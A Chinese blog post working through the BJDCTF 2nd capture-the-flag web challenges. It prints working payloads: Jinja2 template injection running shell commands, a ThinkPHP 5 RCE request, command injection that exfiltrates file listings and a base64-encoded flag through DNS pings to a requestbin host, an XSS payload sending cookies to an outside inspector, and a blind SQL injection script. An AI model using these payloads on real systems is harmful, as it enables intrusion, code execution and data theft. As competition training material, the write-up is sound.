---
layout: post
title: BJDCTF 2nd Web Writeup
data: 2020-03-23
categories: Writeups
tags: 
 - CTF
 - Writeup
description:  
excerpt_separator: <!-- more -->
---

上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。

<!-- more -->

# fake google

{% raw %}

## 题目描述

题目用了谷歌搜索的前端页面，随便输入点东西，返回：

``` 
P3's girlfirend is : foo
```

原样返回了，再看看源码：

``` html
<!--ssssssti & a little trick -->
```

## 解题思路

都这么明显了，直接SSTI，先检测一下什么模板：

```
{{7*'7'}} => 7777777
```

是Jinja2。然后试了一下，发现"{%%}"标签和好多函数都不能用，最后importi了os，读取了flag，Payload：

```
{{''.__class__.__mro__[1].__subclasses__()[64].__init__.__globals__['__import__']('os').popen('base64 < /flag').read()}}
```

## 备注

1. 说实话并不知道为什么那些函数不能用了，回头看看出题笔记。

2. 好像也做过好几个SSTI了，当然只是是非常基础的类型，但每次都是找博客，直接抄抄改改人家的Payload。接下来好好整理总结一下SSTI。

3. Payload找可用函数的时候因为"{%%}"标签不能用，是手动二分出来的，其实可以用Python搞。

4. 还不是很理解Python的类什么的，回炉重造一波。

5. 贴一个官方的Payload：

    ```
    ?name={{ config.class.init.globals['os'].popen('ls /').read() }}
    ```
    

{% endraw %}

----

# old-hack

## 题目描述

是个黑页，目录扫了一遍没什么信息，不过注意到用了ThinkPHP5。

## 解题思路

ThinkPHP5漏洞多多，查看Debug界面，版本为5.0.23，又一个RCE漏洞，百度了Payload：

```
?s=captcha
POST：_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
```

## 备注

1. 并没有了解过ThinkPHP的一系列漏洞，打算抽空学习一下。
2. 然后也没有学习过ThinkPHP的基本用法，Payload也用得云里雾里，下次必学。

----

# dungShell

## 题目描述

提示写到脸上了，有.swp文件。

## 解题思路

源码删减：

{% highlight php linenos %}
<?php
error_reporting(0);
echo "how can i give you source code? .swp?!"."<br>";
if (!isset($_POST['girl_friend'])) {
    die("where is P3rh4ps's girl friend ???");
} else {
    $girl = $_POST['girl_friend'];
    if (preg_match('/\>|\\\/', $girl)) {
        die('just girl');
    } else if (preg_match('/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i', $girl)) {
        echo "<img src='img/p3_need_beautiful_gf.png'> <!-- He is p3 -->";
    } else {
        //duangShell~~~~
        exec($girl);
    }
}
{% endhighlight %}

拦截形同虚设，可以用"php -r"执行PHP代码。不过没有回显，需要将结果打到DNS上。

扫根目录：

```
POST：girl_friend=php -r "system('ping '.substr(implode('.',scandir('/')),6,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
```

读/flag：

```
POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /flag'),0,50).'.295af172a8d3ec4abf30.d.dns.requestbin.buuoj.cn');"
```

分两次读，解码后：

```
flag{flag-is-not-here,please-find-it-by-yourself}
```

不太对劲，要找真正的flag，在.bash_history里面看到了信息，然后再读：

```
POST：girl_friend=php -r "system('ping '.substr(system('bas""e64 /etc/demo/P3rh4ps/love/flag'),0,50).'.46418d29ca743ab417af.d.dns.requestbin.buuoj.cn');"
```

## 备注

1. 后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx\|bash弹Shell，然后find一下flag。

2. 因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下\${foo}。至于"$"符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：

    ```
    POST：girl_friend=php -r "system('ping '.substr(system('ec""ho YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg==|ba""se64 -d|bash'),0,50).'.f9a0ea65a00ba5753d08.d.dns.requestbin.buuoj.cn');"
    
    YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== => a=$(find / -name flag);echo ${a:10:15}|base64
    ```

3. 不得不说，上面这个方法太蛋疼了，得整一个VPS工具。

----

# 简单注入

## 题目描述

上来就是个登录框，注入写到了脸上。

## 解题思路

先看看请求头等其它地方又没有什么信息，无果，那就老老实实注入吧。Fuzz一下，单双引号、select、union都被拦截了。一步一步来。

首先这肯定是个字符型注入，引号又被过滤，只能想着对原有的引号下手，宽字节试了一下没什么用，不过"\\"起作用了，Payload：

```
POST：password=or 2>1#&username=\
```

返回里有句话变了：

```
BJD needs to be stronger
```

失败了？但是修改Payload中的布尔值之后的返回和其它错误密码的结果一样：

```
You konw ,P3rh4ps needs a girl friend
```

这说明刚刚的注入确实成功了，应该是在PHP中将我们的输入和Mysql返回的密码又做了一次对比，那就盲注一下密码，Payload：

```
POST：password=or password regexp ^0x#&username=\
```

Python跑了结果是：

```
ohyoufoundit
```

然后登录，失败了，还是没有通过在PHP中的验证，但在Mysql中确确实实是通过了，很疑惑。

看了官方WP，原来是大小写的问题，所以虽然Mysql通过了，但在PHP中被大小写拦住了，出题人的脚本：

```python
import requests
# P3rh4ps tql!!!
url='http://39.106.207.66:2333/'
def str2hex(string):
    c='0x'
    a=''
    for i in string:
        a+=hex(ord(i))
    return c+a.replace('0x','')
alphabet = ['!','[',']','{','}','_','/','-','&',"%",'#','@','a','b','c','d','e','f','g','h','i','g','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','G','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9']


flag='^'
for i in range(0,20):
    for y in alphabet:
        tmp=flag+y
        data = {
            "username": "P3rh4ps\\",
            "password": "||password regexp binary {}#".format(str2hex(tmp))
        }
   #     print(data['password'])
        x=requests.session()
        if 'BJD needs' in x.post(url,data=data).text:
        #    print(x.post(url,data=data).text)
            flag=tmp
            break
    print(flag.replace("^",""))
```

爆出密码后登录获得flag。

## 备注

1. Fuzz很重要，要先fuzz。
2. Mysql的字段内容在查询的时候是忽略大小写的，但其实在实际的编码存储中还是有区别的。
3. REGEXP匹配是大小写不敏感的，为区分大小写可以加上BINARY关键字。



----

# 假猪套天下第一

## 题目描述

上来是个登录框，随便试试，居然成功了，返回的界面很炫酷，但是没什么信息。

## 解题思路

在返回的页面的源码中找到一个叫"L0g1n.php"的文件，访问一波。返回如下内容：

```
Sorry, this site will be available after totally 99 years!
```

然后可以看到Cookie中有个时间戳，接着就卡住了，因为受Schrodin那题的影响，一直以为是要把时间改早，然后一直没过，其实是要往后改，有新返回：

```
Sorry, this site is only optimized for those who comes from localhost
```

改IP，这里X-Forward-For不能用要用Clint-IP或者X-Real-IP，提交。然后就是好几次类似地改请求头，最后在返回的源码里面找到flag。

其中有一步需要改User-Agent，给的提示是Commodo 64，但实际上型号是Commodore 64，百度直接搜索不到这个结果，不过Google可以。

所有Headers如下：

![hackbar](https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/hackbar.png)

## 备注

1. 还是思维僵化的问题。
2. 对于Headers的了解也不太够。

----

# xss之光

## 题目描述

页面只有九个字符，"gungungun"，抓包看了下也没有任何信息。

## 解题思路

那就扫目录呗，有git泄漏，提取一下：

```php
<?php
$a = unserialize($_GET['yds_is_so_beautiful']);
echo $a;  
```

有点谜，只有一个反序列化，但是没有魔术方法。应该不是反序列化漏洞，注意到反序列化之后会echo出来，可能会和XSS有关。试着alert一下，成功了，但是没有给Cookie。

然后看了提示，要把Cookie打出去，可能要读Cookie？试一试：

```php
serialize("<script>document.body.appendChild(document.createElement('img')).setAttribute('src','https://requestinspector.com/inspect/01e40wkvsk52d6dzx2axgggmqm?c='+document.cookie);</script>")
```

然后在Cookie里面找到了发回来的flag，有点迷。

## 备注

1. 还是思维僵化了，看到unserialize()就总想着反序列化漏洞。
2. 然后对于XSS还是不熟悉。

----

# Schrodin

## 题目描述

一眼看到一大段文字：

````
You can give a wibsite to this page and this page will automatically identify various parameters of the target and try to burst the password.

The longer the compute time is, the higher the success rate of the burst is.

But before the final result is checked, no one knows whether to burst out the password. We call it the superposition state of burst and unburst

You can check the progress at any time, but once you check the progress, this website will stop bursting and delete the relevant progress, which we call the collapse of the superposition state.

If the CPU of the server is idle, it must be able to burst out the password you want very soon :)

Enjoy it!
````

再下面是一个文本框和"Input"、"Check"两个按钮，然后显示了CPU利用率。

## 解题思路

读一读，大致意思是它接受一个URL，然后可以爆破指定页面的密码。而在查看结果之前无法确定是否爆破成功，查看之后无论成功与否都会销毁相关信息。成功率受CPU利用率和爆破时间影响。

然后没有思路，看看源码。源码中发现一个叫做test.php的文件，访问一下是个登录界面，傻乎乎地注了一波没什么结果。

突然想起来是不是要用题目给的页面来对密码进行爆破，试一试，然而成功率很低：

```
Load of Server CPU98.65888129551892%
Already burst 5 sec, 148102 p/s
Forecast success rate 7.564358188440272%
```

失败了：

```
Burst failed, maybe you should try longer.
```

下面就是应该想办法提高成功率了，注意到好像上面三个数据的变化都是不需要联网的，看看JS：

```javascript
function _A(){
	var num = 13;
	var rate = 0.5;
	var c = 1;
	var t = setInterval(function(){
		var symbol = Math.random() > rate ? 1 : -1;
		var add_number = Math.random() * symbol * c;
		if(num + add_number > 100 || num + add_number < 10){
		}
		else{
			num += add_number;
			var span1 = document.getElementById('span1');
			span1.innerText = num + '%';
		}
	}, 100);
}

function _(){
	var num = 13;
	var rate = 0.2;
	var c = 10;
	var t = setInterval(function(){
		var symbol = Math.random() > rate ? 1 : -1;
		var add_number = Math.random() * symbol * c;
		if(num + add_number > 100 || num + add_number < 10){

		}
		else{
			num += add_number;
			var span1 = document.getElementById('span1');
			span1.innerText = num + '%';
		}
	}, 100);
}

function __(sub){
	var s = sub;
	var t = setInterval(function(){
		s += 1;
		var span2 = document.getElementById('span2');
		span2.innerText = s;
	}, 1000);
}

function ___(){
	var t = setInterval(function(){
		var pwd = Math.floor(Math.random()* (150000 - 120000) + 120000);
		span3.innerText = pwd;
	}, 1000);
}

function script(sub){
	var rate = sub;
	var t = setInterval(function(){
		rate += 1;
		span4.innerText = Math.log(rate) * 4.7;
	}, 1000);
}
```

很明显CPU利用率完全是随机数，但是爆破时间函数接受了一个参数，抓包看看，HTML中的脚本是这样的：

```html
<script>_();__(1);___();script(1);</script>
```

两个函数的参数是一样的，来自服务器，然后线索又断了。

继续抓包，看看Check的时候B/S是怎么通信的，注意到发送了两个Cookie，PHPSESSID和dXNlcg，后者一看就有问题，它的内容是"MTU4NTAxMzM2MQ%3D%3D"，base64解码一下，是"user"和"1585013361"。

时间戳？确实，这么说来Check的时候是用时间戳来判断爆破时间的。那就改小一点试一下，成功了：

```
Burst successed! The passwd is av11664517@1583985203.
```

一个B站视频号和一个时间戳，然后在视频的评论区找到flag。

## 备注

1. 脑洞题，唯一的问题就是看到时间戳反应慢了。

----

# elementmaster

## 题目描述

一幅漫画：

![mendeleev](https://glyuan419.github.io/uploads/posts/2020-03-23-BJDCTF-2nd-Web/mendeleev.jpg)

## 解题思路

在源码中看到两个隐藏标签，id后面跟着一串可疑的字符"506F2E"和"706870"，Hex解一下，是"Po."和"php"，拼起来是个PHP文件，访问一下，返回只有一个字符"."。

漫画中提到了门捷列夫和118种元素，而Po也是一种元素，可以试着用Python跑一下每种元素的页面，所有返回拼成了一个新的文件"And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php"，访问获得flag。

## 备注

1. 也是脑洞题，唯一的问题在于忽略了id后面的Hex字符。

----

# 文件探测

## 题目描述

界面挺炫酷的，不过没什么用，然后在源码里发现一点信息：

```html
<!-- Inheriting and carrying forward the traditional culture of the first BJDCTF, I left a hint in some place that you may neglect  -->
```

## 解题思路

Emmm，完全不记得上次BJD有什么传统，不过在响应头中找到一个了提示的文件名"home.php"，原来这是传统啊。

访问一下，要求回答三个问题：

```
你知道目录下都有什么文件吗?
请输入你想检测文件内容长度的url
你希望以何种方式访问？GET？POST?
```

然后作为三个POST参数一起发出去，分别设为foo、bar、quz，返回如下：

```
~$ python fuck.py -u "bar.y1ng.txt" -M quz -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei
       Error:  url invalid
```

没什么线索，不过注意到访问home.php时，URL被重定向为"home.php?file=system"，然后页面还提示了"现在访问的是 system.php"。文件包含吗？伪协议读一下源码：

```
home.php?file=php://filter/convert.base64-encode/resource=home
```

home.php源码删减：

```php
<?php

setcookie("y1ng", sha1(md5('y1ng')), time() + 3600);
setcookie('your_ip_address', md5($_SERVER['REMOTE_ADDR']), time()+3600);

if(isset($_GET['file'])){
    if (preg_match("/\^|\~|&|\|/", $_GET['file'])) {
        die("forbidden");
    }

    if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
        die("not now!");
    }

    if(preg_match("/.?a.?d.?m.?i.?n.?/i", $_GET['file'])){
        die("You! are! not! my! admin!");
    }

    if(preg_match("/^home$/i", $_GET['file'])){
        die("禁止套娃");
    }

    else{
        if(preg_match("/home$/i", $_GET['file']) or preg_match("/system$/i", $_GET['file'])){
            $file = $_GET['file'].".php";
        }
        else{
            $file = $_GET['file'].".fxxkyou!";
        }
        echo "现在访问的是 ".$file . "<br>";
        require $file;
    }
} else {
    echo "<script>location.href='./home.php?file=system'</script>";
}
```

system.php源码删减：

```php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>

<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
}

?>
```

可以发现最后的sprintf()里将字符串匹配了"%d"，所以输出一直是0。不过因为字符串构造的问题，可以发生注入，将$method的值设为"GET%s%"即可。

上面漏了一步，就是得知有admin.php这个文件，可以直接Scanner一把梭，或者推断一下，比如问"你知道目录下都有什么文件吗?"，而这个问题的答案并没有用到。

admin.php的源码：

```php
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}


?>
```

乍一看、\$_SERVER['REMOTE_ADDR']的值要是"127.0.0.1"，不过其实不影响，程序会继续执行。然后Check()的判断只要不乱改Cookie都可以过，然后就是破解AES加密了。

可以看到aesEN()中只有\$data是我们不知道的，它来自存放在SESSION中的一个随机数。看一下它的构成，因为只要设置了decrypt参数，\$_SESSION['secret']就不会更新，所以mt_rand()是可以爆破的，然而没什么用，random_bytes()过不了。

这道题的思路是删掉Cookie中的PHPSESSID，这样\$data就会被置空，Exp：

```php
<?php
echo base64_encode(openssl_encrypt("", "AES-128-CBC", "y1ng", OPENSSL_RAW_DATA, md5("174.0.222.75", true)));
?>
```

## 备注

1. 插一句Base64的构成是字母26*2、数字10、以及"+"和"/"两个符号，当然还有占位符"="。
2. 这道题一开始就没想到要用文件包含读文件，确实有问题。
3. 然后删掉PHPSESSID也挺出乎意料的，还是经验不够，容易钻牛角尖。

----

# EasyAspDotNet

## 备注

被秒了，我被秒了。这道题触及到了我的知识盲区，Windows上的ASP。Emmm，mark一下..

